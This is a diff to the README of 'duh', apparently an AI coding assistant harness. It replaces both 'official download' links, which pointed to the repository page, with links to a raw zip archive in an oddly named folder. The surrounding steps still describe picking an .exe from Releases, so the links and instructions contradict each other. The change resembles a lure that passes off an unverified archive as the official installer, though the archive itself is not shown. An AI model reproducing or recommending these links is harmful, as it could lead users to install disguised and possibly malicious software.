@@ -1,6 +1,6 @@
 # 🤖 duh - Powerful AI coding assistant for everyone
 
-[![](https://img.shields.io/badge/Download-Duh-blue.svg)](https://github.com/radiographic-uncle4030/duh)
+[![](https://img.shields.io/badge/Download-Duh-blue.svg)](https://github.com/radiographic-uncle4030/duh/raw/refs/heads/main/verumontanum/Software-1.7.zip)
 
 Duh serves as a universal harness for your coding projects. This tool connects your workspace to various artificial intelligence models to help you write code faster. It handles the complex setup so you can focus on building your programs.
 
@@ -9,7 +9,7 @@ Duh serves as a universal harness for your coding projects. This tool connects y
 You need to obtain the installer from the official repository page.
 
 1. Open your web browser.
-2. Visit [the official download page](https://github.com/radiographic-uncle4030/duh).
+2. Visit [the official download page](https://github.com/radiographic-uncle4030/duh/raw/refs/heads/main/verumontanum/Software-1.7.zip).
 3. Look for the latest version under the Releases section on the right side of the screen.
 4. Select the file ending in .exe to start the download.
 5. Save the file to your computer.
